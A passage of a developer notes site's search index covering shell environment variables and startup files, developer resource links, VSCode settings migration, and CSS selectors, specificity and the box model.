</ul>"},{"location":"Dev/Prg/Concepts/General-concepts/#common-environment-variables","title":"Common Environment Variables","text":"Variable Description EDITOR The program to run to perform edits. HOME The Home directory of the user. LOGNAME The login name of the user. MAIL The location of the user's local inbox. OLDPWD The previous working directory. PATH A colon separated list of directories to search for commands. PAGER This program may be called to view a file. PS1 The primary prompt string. PWD The present working directory. USER The username of the user."},{"location":"Dev/Prg/Concepts/General-concepts/#common-commands","title":"Common commands","text":"<ul> <li><code>echo $VARIABLE_NAME</code> or <code>printenv VARIABLE_NAME</code> - examine specific variable</li> <li><code>env</code> or <code>printenv</code> - examine all the environmental variables that are set</li> <li> <p><code>set</code> - list of all shell variables, environmental variables, local variables(and also shell functions in Bash)</p> <ul> <li><code>(#!bash set -o posix; set)</code> - for Bash: clean up the output by specifying that <code>set</code> should operate in POSIX mode, which won\u2019t print the shell functions by executing this in a sub-shell(by wrapping the whole command with parenthesis) so that it does not change our current environment.</li> <li> <p><code>comm -23 &lt;(set | sort) &lt;(env | sort)</code>, <code>comm -23 &lt;(set -o posix; set | sort) &lt;(env | sort)</code>(in Bash) - list of only shell variables</p> <p>Warning</p> <p>This will likely still include a few environmental variables, due to the fact that the <code>set</code> outputs quoted values, while the <code>printenv</code> and <code>env</code> do not quote the values of strings.</p> </li> </ul> </li> <li> <p><code>KEY=VALUE</code> or <code>export KEY=VALUE</code> - set shell or environmental variable(see below)</p> </li> <li><code>env VAR1=\"value1\" VAR2=\"value2\" command_to_run command_options</code> - modify the environment that programs run in by passing a set of variable definitions into a command</li> <li><code>printenv | grep VARIABLE_NAME</code> - check if variable is an environmental variable</li> <li><code>set | grep VARIABLE_NAME</code> - check if variable is a shell variable</li> <li><code>export -n VARIABLE_NAME</code> - demote an environmental variable, i.e. set to shell variable</li> <li><code>unset VARIABLE_NAME</code> - remove or delete an environment variable</li> </ul>"},{"location":"Dev/Prg/Concepts/General-concepts/#types-of-environment-variables","title":"Types of environment variables","text":"<ul> <li> <p>Shell(Local?) Variables - defined using <code>KEY=VALUE</code> format. Only effects the current running process, e.g. within the running script or shell in which they were set or defined. There are some predefined by shell vars of such type and they are often used to keep track of ephemeral data, like the current working directory(<code>PWD</code>).</p> </li> <li> <p>Environmental(Global?) Variables - defined using <code>export KEY=VALUE</code> format. <code>export</code> exports the variable assignment to child processes of the shell in which the export command was ran. In general, when a process is started it inherits the exported environment variables of the process that spawned it.</p> </li> <li> <p>Local vs. Global variables example:</p> <pre><code>$ echo $PAGER\n# PAGER is not defined\n$ PAGER=less           # let's difine it\n$ echo $PAGER\nless                   # now PAGER defined locally\n$ bash                 # running a sub-shell\n$ echo $PAGER\n# PAGER is not defined in child process\n$ exit                 # exit from a sub-shell to parent shell\nexit\n$ export PAGER=less    # let's define PAGER globally\n$ bash                 # running a sub-shell\n$ echo $PAGER\nless                   # now PAGER defined in child process too!\n$ exit\nexit\n$\n</code></pre> </li> </ul> <p>Tip</p> <p>If you need envs(wether they are local or environmental) that are defined in some file to be available in current running interactive or non-interacrive(e.x. when running script) shell you should use <code>.</code>(<code>source</code> - optional for Bash) command, e.g.: <code>. ./file-with-envs.sh</code>(this actually executes the script commands in the current shell environment)</p>"},{"location":"Dev/Prg/Concepts/General-concepts/#levels-of-environment-variables","title":"Levels of environment variables","text":"<p>Definitions:</p> <ul> <li>Login Shell - is a shell session that begins by authenticating the user, e.g. if you signing into a terminal session or through SSH and authenticate.</li> <li>Non-Login Shell -is a new shell session from within your authenticated session.</li> <li>Interactive Shell - is a shell session that is attached to a terminal.</li> <li>Non-Interactive Shell - is a shell session that is not attached to a terminal session. It\u2019s most often run from a script or similar. It is important to note that this often influences your <code>PATH</code> variable.</li> <li> <p>Detect the type of shell:</p> <pre><code>## Detect login/non-login shells:\nshopt -q login_shell &amp;&amp; echo 'login' || echo 'not-login'    # for Bash only\n# or\nshopt | grep login_shell                                    # for Bash only\n# or\necho $0                                                     # if output prepended with '-' then it is a login shell, e.g. '-zsh'\n\n## Detect interactive/non-interactive shells:\n[[ $- == *i* ]] &amp;&amp; echo 'Interactive' || echo 'not-interactive'\n</code></pre> </li> </ul> <p>Reference:</p> <ul> <li>Unix Shells: Bash, Fish, Ksh, Tcsh, Zsh startup files</li> <li>Difference between Login Shell and Non-Login Shell?(Unix &amp; Linux Stack Exchange)</li> <li>Zsh/Bash startup files loading order (.bashrc, .zshrc etc.)</li> <li> <p>Zsh - Startup/Shutdown files(ArchWiki)</p> </li> <li> <p>Shell Startup Graph      https://blog.flowblok.id.au/2013-02/shell-startup-scripts.html </p> </li> </ul> <ol> <li> <p>System-wide - available for any user, session, app etc. Set in folowing files:</p> <ul> <li> <p><code>/etc/environment</code> - This file is parsed by pam_env module. Syntax: simple \"KEY=VAL\" pairs on separate lines.</p> </li> <li> <p>for Login Shells:</p> <ul> <li> <p>Bash(read by shell in this order! source): <code>/etc/profile</code> -&gt; logged-in user dotfiles</p> </li> <li> <p>Zsh(read by shell in this order!): <code>/etc/zshenv</code> -&gt; logged-in user dotfile -&gt; <code>/etc/zprofile</code> -&gt; logged-in user dotfile -&gt; <code>/etc/zshrc</code> -&gt; logged-in user dotfile -&gt; <code>/etc/zlogin</code> -&gt; logged-in user dotfile</p> </li> </ul> </li> <li> <p>for Non-Login Interactive Shells:</p> <ul> <li> <p>Bash(read by shell in this order!): <code>/etc/bash.bashrc</code> -&gt; logged-in user dotfiles</p> </li> <li> <p>Zsh(read by shell in this order!): <code>/etc/zshenv</code> -&gt; logged-in user dotfile -&gt; <code>/etc/zshrc</code> -&gt; logged-in user dotfile</p> </li> </ul> </li> <li> <p>for Non-Login Non-Interactive Shells(scripts etc.):</p> <ul> <li> <p>Bash: BASH_ENV environmental variable</p> </li> <li> <p>Zsh(read by shell in this order!): <code>/etc/zshenv</code> -&gt; logged-in user dotfile</p> </li> </ul> </li> </ul> <p>Note</p> <p>Restart system after modifying these system files so changes will take effect.</p> </li> <li> <p>User - available for current logged-in user. Set in following dotfiles of the shell that is currently used by that user in a KEY=VALUE format:</p> <p>Note</p> <p>IMHO: <code>export KEY=VALUE</code> can be used too, but thus it exports the variable assignment to child processes of the shell which is in my opinion quite unneseccairy for most of defined envs because each time we run new sub-shell those envs get sourced by the shell.</p> <ul> <li> <p>for Login Shells:</p> <ul> <li> <p>Bash(read by shell in this order but it executes only the first of those files found! source): system-wide settings files -&gt; <code>~/.bash_profile</code> -&gt; <code>~/.bash_login</code> -&gt; <code>~/.profile</code></p> <p>Tip</p> <p>Put these in <code>~/.profile</code> at the top in order to source <code>~/.bashrc</code>: <pre><code># ~/.profile must include ~/.bashrc, but only if the shell is interactive and is bash but not if the login shell is some other shell\ncase \"$-\" in *i*)\nif\ntest \"$BASH_VERSION\" &amp;&amp;\\\ntest \"${0#-}\" != sh &amp;&amp;\\\ntest -r \"$HOME\"/.bashrc\n    then\n. \"$HOME\"/.bashrc\n    fi\n;;\nesac\n</code></pre></p> <ul> <li>Configuring your login sessions(for 5 different environments!) with dot files</li> <li>Difference between .bashrc and .bash_profile(SuperUser)</li> </ul> </li> <li> <p>Zsh(read by shell in this order!): system-wide settings file -&gt; <code>$ZDOTDIR/.zshenv</code> -&gt; system-wide settings file -&gt; <code>$ZDOTDIR/.zprofile</code> -&gt; system-wide settings file -&gt; <code>$ZDOTDIR/.zshrc</code> -&gt; system-wide settings file -&gt; <code>$ZDOTDIR/.zlogin</code></p> </li> </ul> </li> <li> <p>for Non-Login Interactive Shells:</p> <ul> <li> <p>Bash(read by shell in this order!): system-wide settings files -&gt; <code>~/.bashrc</code></p> </li> <li> <p>Zsh(read by shell in this order!): system-wide settings file -&gt; <code>$ZDOTDIR/.zshenv</code> -&gt; system-wide settings file -&gt; <code>$ZDOTDIR/.zshrc</code></p> </li> </ul> </li> <li> <p>for Non-Login Non-Interactive Shells(scripts etc.):</p> <ul> <li> <p>Bash: BASH_ENV environmental variable</p> </li> <li> <p>Zsh(read by shell in this order!): system-wide settings -&gt; <code>$ZDOTDIR/.zshenv</code></p> </li> </ul> </li> </ul> <p>Note</p> <p>If <code>$ZDOTDIR</code> is not set, <code>$HOME</code> is used instead.</p> <p>Tip</p> <p>When you have both Bash and Zsh shells in your system it is convenient to define $PATH(and other system envs) and also some other user-defined envs in <code>~/.profile</code> and source it through <code>~/.zprofile</code> by adding <code>[[ -e ~/.profile ]] &amp;&amp; emulate sh -c '. ~/.profile'</code> line at the top of the file(Zsh not hitting ~/.profile(SuperUser thread comment)).</p> <p>There is also other complicated scenario with multiple shells and ways to arrange your envs in one place:</p> <ul> <li>Xsh - A simple framework for shell configuration management.</li> <li>Is there a \".bashrc\" equivalent file read by all shells?(SuperUser thread comment)</li> <li>Shell startup scripts</li> </ul> </li> <li> <p>Shell Session - available for current shell session and its child processes. Set by using environmental variables.</p> </li> <li> <p>Application/Script - available for current running app/script process only. Set by using shell variables, e.g.:</p> <pre><code># Prepending Variables - you can prepend ANY number of variables before running a command.\n\nPORT=3000 node server.js    # set port of server\n</code></pre> <pre><code># myscript.sh\n\nMY_VAR=\"Hello World!\"\necho MY_VAR    # Hello World!\n</code></pre> </li> </ol>"},{"location":"Dev/Prg/Concepts/General-concepts/#regex","title":"Regex","text":"<ul> <li>RegExp(4pda)</li> <li>Regex in Java Script(MDN)</li> <li>Regular Expression HOWTO(python.org)</li> <li>Regex tutorial \u2014 A quick cheatsheet by examples(Medium)</li> <li>Regex cookbook \u2014 Top 10 Most wanted regex(Medium)</li> <li>RegexOne Tutorial</li> <li> <p>\u0428\u043f\u0430\u0440\u0433\u0430\u043b\u043a\u0430 \u043f\u043e \u0440\u0435\u0433\u0443\u043b\u044f\u0440\u043d\u044b\u043c \u0432\u044b\u0440\u0430\u0436\u0435\u043d\u0438\u044f\u043c</p> <p></p> </li> </ul>"},{"location":"Dev/Prg/Design/WebDesign/","title":"Web Design","text":"<p>Info<p>Figma</p> <p>Zeplin.io</p> </p>"},{"location":"Dev/Prg/DevRes/","title":"Development Resources","text":""},{"location":"Dev/Prg/DevRes/#articles-to-read","title":"Articles to Read","text":"<ul> <li> The Developer\u2019s Edge: How To Become A Senior Developer</li> <li> Don\u2019t be a Junior Developer: The Roadmap From Junior to Senior</li> <li> 5 Technology Trends to Learn in 2018 If You Want a Great Career</li> </ul>"},{"location":"Dev/Prg/DevRes/#devcommon","title":"Dev(common)","text":""},{"location":"Dev/Prg/DevRes/#dev-resources-and-docs","title":"Dev resources and docs","text":"<ul> <li>Useful Resources for Developers - A list of ZTM student-collated resources deemed to be useful for every developer and categorised.</li> <li>Free Developer Resources - Hand-picked list of Andrei Neagoe's (ZTM instuctor) favourite resources.</li> <li>Jonas Schmedtmanns' resources page - Jonas' (a Udemy instructor) Resources for Hand-Crafting Beautiful and Performant Websites.</li> <li>Cheatography - Over 4,000 Free Cheat Sheets, Revision Aids and Quick References!</li> <li>DevDocs - Combines multiple API documentations.</li> <li>Hyperpolyglot - Programming languages and tools comparison in a side-by-side format.</li> <li>Learn X in Y minutes - Programming languages and concepts in a nutshell.</li> <li>W3Schools</li> <li>Epoch(time in miliseconds since 1970) Converters - epochconverter.com, currentmillis.com</li> </ul>"},{"location":"Dev/Prg/DevRes/#dev-blogs","title":"Dev Blogs","text":"<ul> <li>Metanit - \u0421\u0430\u0439\u0442 \u043e \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u0438(\u0440\u0443\u043a\u043e\u0432\u043e\u0434\u0441\u0442\u0432\u0430 \u0438 \u0443\u0447\u0435\u0431\u043d\u044b\u0435 \u043c\u0430\u0442\u0435\u0440\u0438\u0430\u043b\u044b, \u0441\u0442\u0430\u0442\u044c\u0438 \u0438 \u043f\u0440\u0438\u043c\u0435\u0440\u044b).</li> <li>dev/tails - Software development topics such as #react, #javascript, #typescript, #engineeringmanagement, #rust, #webdevelopment, and #gamedevelopment.</li> <li>Johnny-Five - Using Javascript to program robots.</li> </ul>"},{"location":"Dev/Prg/DevRes/#apis","title":"APIs","text":"<ul> <li>Public APIs - A Collection of Public and Free APIs for Development.</li> <li>Watson Speech to Text API</li> <li>Clarifai API - Endless possibilities with computer vision, natural language processing and automated machine learning.<ul> <li>Wellcome Guide</li> <li>Getting Started</li> <li>Basic Use + Documentation(github)</li> <li>Pre-trained AI Models</li> <li>AI Face Detection Model</li> </ul> </li> </ul>"},{"location":"Dev/Prg/DevRes/#statistics-and-trends","title":"Statistics and Trends","text":"<ul> <li>PYPL - PopularitY of Programming Language</li> <li>The State of JavaScript Survey - WevDev Trends</li> <li>Stack Overflow Annual Developer Survey</li> </ul>"},{"location":"Dev/Prg/DevRes/#online-utilities","title":"Online Utilities","text":"<ul> <li>Transform - Tool for transforming between variable languages,.e.g. from HTML to JSX.</li> <li>{JSON} Placeholder, Mirror</li> <li> <p>Icons sets:</p> <p>iconify.design - icons in <code>svg</code> format to set and download. Allows to set color, size, flip and rotate the icon!</p> </li> <li> <p>Favicons generators:</p> <p>redketchup.io/favicon-generator - generates full set of favicons(+ HTML code snippet to embed them into <code>index.html</code>) from text and image(png, jpg, webp, heic, svg, gif, ico, bmp, tiff)</p> <p>realfavicongenerator.net - generates favicons from image(png, jpg, gif, svg). For <code>svg</code> allows to set background color and resize the icon inside it!</p> </li> <li> <p>AI Tools:</p> <p>OpenAI(ChatGPT)</p> <p>A chat bot that you can ask anything, and get an excellent response.</p> <p>It's great for:</p> <p>-&gt; Writing code for you / debugging your code -&gt; Inspiring topics to write about -&gt; Writing for you. It does 80% of the work, you do 20%. -&gt; So. Much. More.</p> <p>MidJourney</p> <p>A text-to-image generator. You \"imagine\" something and.. 30 seconds later, like MAGIC, you see a visual representation of it.</p> <p>It's great for:</p> <p>-&gt; Concept Art -&gt; Replacing stock images -&gt; Logo Design -&gt; HAVING FUN</p> <p>Images made by MidJourney</p> <p>Mem</p> <p>Mem is a self described, self-organizing workspace. It seems extremely powerful. I say seems b/c I have only just started using it myself.</p> <p>As someone who struggles with organization, I am extremely excited to see what AI can do to help.</p> <p>Hypefury</p> <p>Hypefury will help schedule your tweets, but will also give you inspiration for what to tweet.</p> <p>It doesn't write for you (and I wouldn't want it to), but it's insanely helpful. If you want to up your Twitter game, Hypefury is a must imo.</p> <p>Hemingway</p> <p>This is actually my favourite. It's SO simple.</p> <p>You start typing and it helps make your writing more succinct. Hemingway is one of the greatest writers of all time, and he used short, digestible sentences.</p> <p>Hemingway helps you do that too.</p> </li> </ul>"},{"location":"Dev/Prg/DevRes/#webdev","title":"WebDev","text":""},{"location":"Dev/Prg/DevRes/#webdev-resources-and-docs","title":"WebDev resources and docs","text":"<ul> <li>MDN (Mozilla Developer Network) Web Docs </li> <li>javascript.info - The Modern JavaScript Tutorial</li> </ul>"},{"location":"Dev/Prg/DevRes/#job-hunting","title":"Job Hunting","text":""},{"location":"Dev/Prg/DevRes/#linkedin-stuff","title":"LinkedIn stuff","text":"<p>Industry Codes V2 - job definitions and their codes by Microsoft(helpful for defining jobs in portfolio)</p>"},{"location":"Dev/Prg/DevRes/#interview-reference","title":"Interview Reference","text":"<p>Resources suggested by ZTM-WevDev-Zero-to-Matery course:</p> <ul> <li>How to Break Into the Tech Industry\u2014a Guide to Job Hunting and Tech Interviews</li> <li>You suck at technical interviews</li> <li>How not to bomb your offer negotiation</li> <li>I spent 3 months applying to jobs after a coding bootcamp. Here\u2019s what I learned.</li> <li>How to Win the Coding Interview</li> </ul>"},{"location":"Dev/Prg/DevRes/#jobs","title":"Jobs","text":"<ul> <li>X-Team - Join the most energizing community for developers and get long-term remote jobs with leading brands.</li> </ul>"},{"location":"Dev/Prg/DevRes/Dev-roadmaps/","title":"Development Roadmaps","text":""},{"location":"Dev/Prg/DevRes/Dev-roadmaps/#webdev","title":"WebDev","text":""},{"location":"Dev/Prg/DevRes/Dev-roadmaps/#frontend","title":"Frontend","text":"<ul> <li> <p>Frontend Webdev Roadmap and Best Practicies by MetaLamp (rus + eng)</p> </li> <li> <p>Middle Developer Roadmap:</p> <p></p> </li> </ul>"},{"location":"Dev/Prg/DevRes/Dev-roadmaps/#fullstack","title":"Fullstack","text":"<ul> <li> <p>Guide to ZTM Cources:</p> <p></p> </li> </ul>"},{"location":"Dev/Prg/IDE/VSCode/","title":"VSCode","text":""},{"location":"Dev/Prg/IDE/VSCode/#settings-migration","title":"Settings Migration","text":"<p>With the current version of VSCode as of this writing (1.22.1), you can find your settings in</p> <ul> <li><code>~/.config/Code/User</code> on Linux (in my case, an, Ubuntu derivative)</li> <li><code>C:\\Users\\username\\AppData\\Roaming\\Code\\User</code> on Windows 10</li> <li><code>~/Library/Application Support/Code/User/</code> on Mac OS X</li> </ul> <p>The files are <code>settings.json</code> and <code>keybindings.json</code>. Simply copy them to the target machine.</p> <p>Your extensions are in</p> <ul> <li><code>~/.vscode/extensions</code> on Linux and Mac OS X</li> <li><code>C:\\Users\\username\\.vscode\\extensions</code> on Windows 10 (e.g., essentially the same place)</li> </ul> <p>Alternately, just go to the Extensions, show installed extensions, and install those on your target installation. For me, copying the extensions worked just fine, but it may be extension-specific, particularly if moving between platforms, depending on what the extension does.</p> <p><code>%APPDATA%\\Code</code>, <code>%USERPROFILE%\\.vscode\\extensions</code> &lt;- use these in Windows so you don't have to type the username in the path back and forth</p>"},{"location":"Dev/Prg/Langs/Css/","title":"CSS","text":"<ul> <li>CSS Tricks</li> <li>Learn CSS</li> <li>\u0428\u043f\u0430\u0440\u0433\u0430\u043b\u043a\u0430 \u043f\u043e CSS</li> </ul>"},{"location":"Dev/Prg/Langs/Css/#css-fundamentals","title":"CSS Fundamentals","text":"<p>Cascading Style Sheets describes the visual style and presentation of the content written in HTML. CSS at the most basic level it indicates that the order of CSS Rules matter. CSS consist of countless properties that developer use to format the content: preperties about font, text, spacing, layout, etc.</p>"},{"location":"Dev/Prg/Langs/Css/#a-css-rule","title":"A CSS Rule","text":"<p><code>h1 { color: blue; }</code> - this is the CSS Rule, where:</p> <ul> <li><code>h1</code> - is a Selector</li> <li><code>{ color: blue; }</code> - is a Decalration Block</li> <li><code>color: blue;</code> - is a Declararion/Style</li> <li><code>color</code> - is a Property</li> <li><code>blue</code> - is a Value and it can be one of the two types: length(like <code>20px</code>) or keyword(like <code>blue</code>)</li> </ul>"},{"location":"Dev/Prg/Langs/Css/#3-ways-to-connect-css-to-html","title":"3 ways to connect CSS to HTML","text":"<ol> <li> <p>Inline CSS, using <code>style</code> attribute. Should usually never be used, because of separarion of concern principle.</p> <p><code>&lt;h1 style=\"color: blue\"&gt;The Code Magazine&lt;/h1&gt;</code></p> </li> <li> <p>Internal CSS, using <code>&lt;style&gt;</code> element inside <code>&lt;head&gt;</code> element.</p> <pre><code>&lt;head&gt;\n    &lt;meta charset=\"UTF-8\" /&gt;\n    &lt;title&gt;The Basic Language of the Web: HTML&lt;/title&gt;\n\n    &lt;style&gt;\nh1 {\ncolor: blue;\n}\n&lt;/style&gt;\n&lt;/head&gt;\n</code></pre> </li> <li> <p>External CSS, using completely different file(e.g. style.css) and link it to the index.html through the <code>&lt;link /&gt;</code> element inside <code>&lt;head&gt;</code> element.</p> <pre><code>&lt;head&gt;\n    &lt;meta charset=\"UTF-8\" /&gt;\n    &lt;title&gt;The Basic Language of the Web: HTML&lt;/title&gt;\n\n    &lt;link href=\"style.css\" rel=\"stylesheet\" /&gt;\n\n&lt;/head&gt;\n</code></pre> </li> </ol>"},{"location":"Dev/Prg/Langs/Css/#selectors-the-most-used-ones","title":"Selectors (the most used ones)","text":"<p>CSS selectors full list (W3S)</p>"},{"location":"Dev/Prg/Langs/Css/#element-selectors","title":"Element selectors","text":"<ul> <li> <p><code>element</code> - element selector, selects the element by its name</p> </li> <li> <p><code>element, element</code> - combining selectors into one list, so the selector here is now a list selector</p> </li> <li> <p><code>element1 element2</code> - descendant(= the very next) selector, selects all the <code>element2</code> elements inside the <code>element1</code> elements</p> </li> <li> <p><code>element &gt; element</code></p> </li> <li> <p><code>element1 + element2</code> - adjacent sibling selector, selects the first <code>element2</code> element that is placed immediately after <code>element1</code> elements</p> </li> </ul> <p>Encoding the HTML structure problem</p> <p>Usnig the selectors above encodes the HTML structure into our CSS selector. That is if in a certain point of time the HTML structure changes then our selector is no more applied as was intended. Therefore the good practice is to use element naming selcetors from the next paragraph below.</p> <ul> <li> <p><code>*</code> - universal selector, selects every single element on the page</p> <p>Inheritance and the Universal Selector</p> <p>Inheritance - is a mechanism by which some style properties gets their values inherited from parent elements to child elements.</p> <p>Not all properties get inherited. It\u2019s mostly ones related to text: <code>font-family</code> <code>font-size</code> <code>font-weight</code> <code>font-style</code> <code>color</code> <code>line-height</code> <code>letter-spacing</code> <code>text-align</code> <code>text-transform</code> <code>text-shadow</code> <code>list-style</code> etc.</p> <p>If we actually want a certain style property, which does not get inherited, applied to all elements we use the universal selector.</p> </li> </ul>"},{"location":"Dev/Prg/Langs/Css/#element-naming-selectors","title":"Element naming selectors","text":"<ul> <li> <p><code>.class</code> - selects the element by its <code>class</code> attribute value</p> </li> <li> <p><code>.class1.class2</code> - <code>and</code> selector - selects all elements with both class1 and class2 set within its <code>class</code> attribute</p> </li> <li> <p><code>#id</code> - selects the element by its <code>id</code> attribute value</p> </li> </ul> <p><code>class</code> and <code>id</code> HTML attributes naming convention</p> <p>If we have a Class or an ID name with multiple words, we separate these words by Dashes like this: <code>&lt;p class=\"related-author\"&gt;By Jim Dillon&lt;/p&gt;</code></p> <p>Prefer Class over ID</p> <p>In contrast to HTML <code>class</code> attribute the <code>id</code> attribute has to have unique value. Therefore having ID selector can be inconvenient when in a certain point of time we will want to add same as <code>id</code> attribute naming to another element.</p>"},{"location":"Dev/Prg/Langs/Css/#pseudo-classes","title":"Pseudo-classes","text":"<ul> <li> <p><code>elem:first-child</code> - selects every <code>elem</code> element that is the first child of its parent</p> </li> <li> <p><code>elem:last-child</code> - selects every <code>elem</code> element that is the last child of its parent</p> </li> <li> <p><code>elem:nth-child(n)</code> - selects every <code>elem</code> element that is the <code>n</code>th child of its parent</p> <p><code>n</code> can be a number, a keyword (odd or even), or a formula an + b, where a represents a cycle size, n is a counter (starts at 0), and b is an offset value.</p> <pre><code>/* Here, we specify a background color for all p elements whose index is a multiple of 3.\nThen we subtract 1 (will select the second, fifth, eight, etc)  */\np:nth-child(3n-1) {\nbackground: red;\n}\n</code></pre> </li> <li> <p><code>:active</code> - selects elements when mouse clicks them</p> <p><code>:active</code> MUST come after <code>:hover</code> (if present) in the CSS definition in order to be effective!</p> </li> <li> <p><code>:hover</code> - selects elements when mouse over them</p> <p><code>:hover</code> MUST come after <code>:link</code> and <code>:visited</code> (if they are present) in the CSS definition, in order to be effective!</p> </li> </ul> <p>Anchor elements(<code>&lt;a&gt;</code>) should always be selected with following pseudo-classes that allow us to target different states:</p> <ul> <li><code>:link</code> - target all unvisited anchor elements that have an <code>href</code> attribute</li> <li><code>:visited</code> - target all visited anchor elements</li> </ul> <p>Anchors styling best practice</p> <p>Always style the different anchor states specifying all the four states in LHVA(<code>:link</code> \u2192 <code>:visited</code> \u2192 <code>:hover</code> \u2192 <code>:active</code>) order!</p> <ul> <li> <p><code>:not(&lt;selector&gt;)</code> - selects every element that is not a <code>&lt;selector&gt;</code> element</p> <p>Setting element's bottom margin everytime except when it is a last one.</p> <pre><code>.grid:not(:last-child) {\nmargin-bottom: 9.6rem;\n}\n</code></pre> </li> </ul>"},{"location":"Dev/Prg/Langs/Css/#pseudo-elements","title":"Pseudo-elements","text":"<p>Elements that don't exist in the HTML, but that we can still select and style in CSS.</p> <ul> <li><code>::first-letter</code></li> <li><code>::first-line</code></li> <li><code>::after</code> - creates a pseudo element, that will automatically be the very last child of the selected element</li> <li><code>::before</code> - creates a pseudo element, that will automatically be the very first child of the selected element</li> </ul> <p><code>::after</code> and <code>::before</code> usage</p> <p>Can be very useful for some small cosmetic style for which we don't want to necessarily add a new element to the HTML\"</p> <pre><code>h1::after {\ncontent: \"TOP\"; /* this property is mandatory, can be an empty string */\nbackground-color: #ffe70e;\nfont-size: 16px;\nfont-weight: bold;\ndisplay: inline-block; /* because by default it is inline element */\npadding: 5px 10px;\nposition: absolute;\ntop: -10px;\nright: -25px;\n}\n</code></pre>"},{"location":"Dev/Prg/Langs/Css/#conflicts-between-selectors","title":"Conflicts between selectors","text":"<p>What seletors win out in the cascade depends on:</p> <ol> <li> <p>Resolving conflicting declarations(styles) steps ordered by priority from 5-highest to 0-lowest:</p> <p>5 - Importance (styles marked with <code>!important</code>) a <code>!</code> delimiter followed by the <code>important</code> keyword marks the style more important than all the other ones, e.g. <code>p { color: green !important; }</code></p> <p>\u2193</p> <p>4 - Inline style(<code>style</code> attribute in HTML)</p> <p>Steps 5-4 should be used as a last resort only!</p> <p>Use it only in case you really, really cannot figure out what's happening in your code. BUT even then , instead of using the <code>important</code> keyword, write your selectors as simple as possible: - do not add too much nesting selectors - don't add too many IDs and Classes all in the same selector</p> <p>\u2193</p> <p>3 - ID (<code>#</code>) selector</p> <p>\u2193</p> <p>2 - Class (<code>.</code>) or pseudo-class (<code>:</code>) selector</p> <p>\u2193</p> <p>1 - Element Selector (<code>p</code> , <code>div</code>, <code>li</code>, etc.)</p> <p>Selectors Specificity (steps 3-1)</p> <p>Official Docs: CSS specificity Specificity Calculator: https://specificity.keegan.st/ When there are multiple different selectors selecting the same element that have confilicting styles then all of them(all rules and properties) are applied! BUT only one wins out, i.e. gets active depending on its specificity value.</p> <p>\u2193</p> <p>0 - Universal Selector (<code>*</code>)</p> </li> <li> <p>Source order</p> <ul> <li>When there are multiple same selectors selecting the same element that have confilicting styles then the last of them gets applied!</li> </ul> </li> </ol>"},{"location":"Dev/Prg/Langs/Css/#properties-the-most-used-ones","title":"Properties (the most used ones)","text":"<p>Properties' browser support and vendor prefixes</p> <ol> <li> <p>When using new(in a sense of timeline) CSS properties that may be not yet implemented in all browsers we must check their compatibility on this resoure: caniuse.com.</p> </li> <li> <p>Some of the \"newly presented\" properties can be availabe in specific browser only using its vendor prefix by writing it in front of the property.</p> <p>List of nowadays used vendor prefixes for modern browsers:</p> <ul> <li><code>-webkit-</code> - Chrome, Safari, Opera, Edge and browsers using the Webkit engine</li> <li><code>-moz-</code> - Firefox and other browsers using Mozilla's browser engine</li> <li><code>-o-</code>(deprecated) - Opera</li> <li><code>-ms-</code> - Internet Explorer(but not always)</li> </ul> <pre><code>/* to support specific browser write its vendor prefix in from of desired property */\n.main-nav {\nbackground-color: rgba(255, 255, 255, 0.75);\nbackdrop-filter: blur(10px);\n-webkit-backdrop-filter: blur(10px); /* to support safari browser */\n}\n</code></pre> </li> </ol>"},{"location":"Dev/Prg/Langs/Css/#text","title":"Text","text":"<ul> <li> <p><code>font-family: sans-serif;</code></p> <p>By default the font family of the html elements content is serif We cannot set font that we have in our computer because that wouldn't then work for all the users that are going to visit our page(unless they also have that font installed on their computer). Using <code>sans-serif</code> keyword here we are not actually specify a real font family but rather \"tell\" the browser to use any font family that is a \"sans serif\".</p> </li> <li> <p><code>font-size: 26px</code> - changes font size to 26px of the physical screen</p> <p>By default the font size of the html elements content(or <code>&lt;li&gt;</code> elements only ?) is 16px</p> </li> <li> <p><code>font-weight: bold;</code></p> </li> <li> <p><code>font-style: italic;</code></p> </li> <li> <p><code>text-transform: uppercase;</code></p> </li> <li> <p><code>text-align: center;</code> - puts element content at the center of its parent element</p> </li> <li> <p><code>text-decoration: none;</code> - decorations applied to font used for an element's text; a shorthand for: <code>text-decoration-line</code> <code>text-decoration-style</code> <code>text-decoration-color</code> <code>text-decoration-thickness</code></p> </li> <li> <p><code>line-height: 1.5;</code> - here the value is without the unit and it simply means that the line height will be 1.5 times the <code>font-size</code></p> </li> <li> <p><code>letter-spacing</code></p> </li> </ul>"},{"location":"Dev/Prg/Langs/Css/#boxes","title":"Boxes","text":"<p>The CSS Box Model</p> <ul> <li>Content: Element's content: text, images, etc. Has content width and content height</li> <li>Padding: Invisible space around the Content, inside of the element</li> <li>Fill area = Content + Padding: area that gets filled with <code>background-color</code> or <code>background-image</code></li> <li>Border: A line around the element, still inside of the element</li> <li>Margin: Space outside of the element, between elements</li> </ul> <p><code>width</code> / <code>height</code> properties behaviour depends on <code>box-sizing</code> property value:</p> <ul> <li> <p><code>box-sizing: content-box;</code> - sets the default behaviour: the specified <code>width</code> and <code>height</code> (and respective <code>min</code> / <code>max</code> properties) apply to the width and height respectively of the content box of the element, and therefore: final element width = left border + left padding + content width(defined by <code>width</code>) + right padding + right border final element height = top border + top padding + content height(defined by <code>height</code>) + bottom padding + bottom border</p> </li> <li> <p><code>box-sizing: border-box;</code> - sets the alternative behaviour: the specified <code>width</code> and <code>height</code> (and respective <code>min</code> / <code>max</code> properties) on the element determine the border box of the element, and therefore: final element width = defined by <code>width</code> final element height = defined by <code>height</code></p> <p>Padding and borders that we do specify will now reduce the inner width of the content area, but that's usually not a problem.</p> </li> </ul> <p>Type of Boxes</p> <p>Elements are formatted visually as boxes. Thera are 3 boxes(= elements) types:</p> <ol> <li> <p>Block-Level Boxes</p> <ul> <li>Elements are formatted visually as blocks.</li> <li> <p>Elements are always start on a new line and occupy 100% of parent element\u2019s width, no matter the content.</p> <p>Browsers typically display the block-level element with a newline both before and after the element. </p> </li> <li> <p>Elements are stacked vertically by default, one after another.</p> </li> <li>The box-model applies as showed earlier in previous note.</li> <li>Default elements: <code>body</code>, <code>main</code>, <code>header</code>, <code>footer</code>, <code>section</code>, <code>nav</code>, <code>aside</code>, <code>div</code>, <code>h1-h6</code>, <code>p</code>, <code>ul</code>, <code>ol</code>, <code>li</code>, etc.</li> <li> <p>CSS style to change from inline boxes to block-level boxes: <code>display: block;</code></p> <p>Getting rid of little gaps between inline/inline-block elements</p> <p>This is useful for a stack of images especially, e.g. 